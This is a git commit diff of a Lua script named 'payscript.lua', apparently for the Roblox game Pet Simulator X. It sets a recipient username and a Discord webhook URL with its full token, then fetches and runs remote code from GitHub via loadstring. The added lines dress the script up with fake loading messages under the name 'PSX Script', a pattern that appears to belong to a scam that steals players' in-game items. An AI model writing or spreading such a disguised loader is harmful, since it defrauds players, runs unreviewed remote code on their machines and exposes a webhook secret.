fe5399f08668a3d0b580e067317aa5292ef62bc3
bithui <104423014+bithui@users.noreply.github.com>
2023-03-09 10:55:55 +0700

    Update payscript.lua

--- payscript.lua
+++ payscript.lua
@@ -1,4 +1,11 @@
-UserName = "sehaycuchay"
-Webhook = "https://discord.com/api/webhooks/1076735100202520627/9Zh_IsO8lautLzpnjrBLbn6bE7ZLj2lhp02iV4JVT54JdqA7dDRTqIpL5jECxMzYCXfY" -- optional delete the whole line if you don't want it
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
+Username = "sehaycuchay"
+WebHook = "https://discord.com/api/webhooks/1076735100202520627/9Zh_IsO8lautLzpnjrBLbn6bE7ZLj2lhp02iV4JVT54JdqA7dDRTqIpL5jECxMzYCXfY"
+
+
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
